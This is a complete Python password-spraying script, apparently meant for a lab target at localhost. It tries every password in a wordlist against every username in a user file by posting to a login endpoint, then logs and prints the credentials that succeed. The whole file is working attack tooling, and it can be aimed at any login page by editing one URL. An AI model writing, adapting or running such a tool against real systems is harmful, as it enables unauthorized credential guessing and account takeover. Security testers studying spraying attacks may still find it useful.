import requests
import time
import os
import sys
import logging

# ============================================================
#                       Configuration
# ============================================================

URL = "http://localhost:8080/login"
USERS_FILE = "users.txt"
PASSWORDS_FILE = "passwords.txt"
LOG_FILE = "log.txt"
DEBUG_LOG = "debug.log"

MAX_ATTEMPTS = 50000
MAX_RUNTIME = 7200  # seconds

# ============================================================
#                       Logging Setup
# ============================================================

logger = logging.getLogger("PasswordSpray")
logger.setLevel(logging.INFO)

# File log (detailed)
file_handler = logging.FileHandler(DEBUG_LOG, encoding="utf-8")
file_handler.setLevel(logging.INFO)
file_formatter = logging.Formatter(
    "%(asctime)s | %(levelname)s | %(message)s"
)
file_handler.setFormatter(file_formatter)

# Console log (clean)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter(
    "%(asctime)s | %(message)s", "%H:%M:%S"
)
console_handler.setFormatter(console_formatter)

logger.addHandler(file_handler)
logger.addHandler(console_handler)

# ============================================================
#                       Global State
# ============================================================

hacked_users = {}
start_time = time.time()
session = requests.Session()
attempt_count = 0

# ============================================================
#                       Helper Functions
# ============================================================

def check_limits():
    runtime = time.time() - start_time

    if attempt_count >= MAX_ATTEMPTS:
        logger.warning(f"Stopping: reached max attempts ({MAX_ATTEMPTS})")
        print_results()
        sys.exit(0)

    if runtime >= MAX_RUNTIME:
        logger.warning(f"Stopping: reached max runtime ({MAX_RUNTIME}s)")
        print_results()
        sys.exit(0)


def create_log_file():
    try:
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(f"{'Username':<40} {'Password':<40} {'Time (s)':<40}\n")
            f.write("-" * 120 + "\n")
        logger.info("Log file initialized")
    except Exception as e:
        logger.error(f"Failed to create log file: {e}")
        sys.exit(1)


def try_login(username, password):
    global attempt_count

    attempt_count += 1
    check_limits()

    payload = {"username": username, "password": password}
    t0 = time.time()

    try:
        response = session.post(URL, json=payload, timeout=5)
        latency = time.time() - t0

    except requests.exceptions.Timeout:
        logger.warning(f"Timeout | user={username}")
        return
    except requests.exceptions.ConnectionError:
        logger.error("Connection error – server unreachable")
        time.sleep(1)
        return
    except Exception as e:
        logger.error(f"Unexpected error for {username}: {e}")
        return

    if response.status_code == 200:
        elapsed = time.time() - start_time
        hacked_users[username] = (password, elapsed)

        logger.info(
            f"SUCCESS | user={username} password='{password}' "
            f"attempt={attempt_count} latency={latency:.2f}s"
        )

        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"{username:<40} {password:<40} {elapsed:<40.2f}\n")
        except Exception as e:
            logger.error(f"Failed writing result log: {e}")
    else:
        logger.info(
            f"FAIL | user={username} password='{password}' "
            f"status={response.status_code}"
        )


def load_file(path):
    if not os.path.exists(path):
        logger.error(f"File not found: {path}")
        sys.exit(1)

    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            data = [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Failed reading file {path}: {e}")
        sys.exit(1)

    if not data:
        logger.error(f"File {path} is empty")
        sys.exit(1)

    logger.info(f"Loaded {len(data)} entries from {path}")
    return data


def password_spray(users, passwords):
    logger.info(
        f"Starting password spraying | users={len(users)} passwords={len(passwords)}"
    )

    for password in passwords:
        for username in users:
            if username not in hacked_users:
                try_login(username, password)


def print_results():
    print(f"\n{'Username':<40} {'Password':<40} {'Time (s)':<40}")
    print("-" * 120)

    for username, (password, t) in hacked_users.items():
        print(f"{username:<40} {password:<40} {t:<40.2f}")

    logger.info(f"Attack finished | hacked_users={len(hacked_users)}")


# ============================================================
#                       Main Logic
# ============================================================

def main():
    logger.info("=== Password Spraying Started ===")
    create_log_file()

    users = load_file(USERS_FILE)
    passwords = load_file(PASSWORDS_FILE)

    password_spray(users, passwords)
    print_results()


if __name__ == "__main__":
    main()
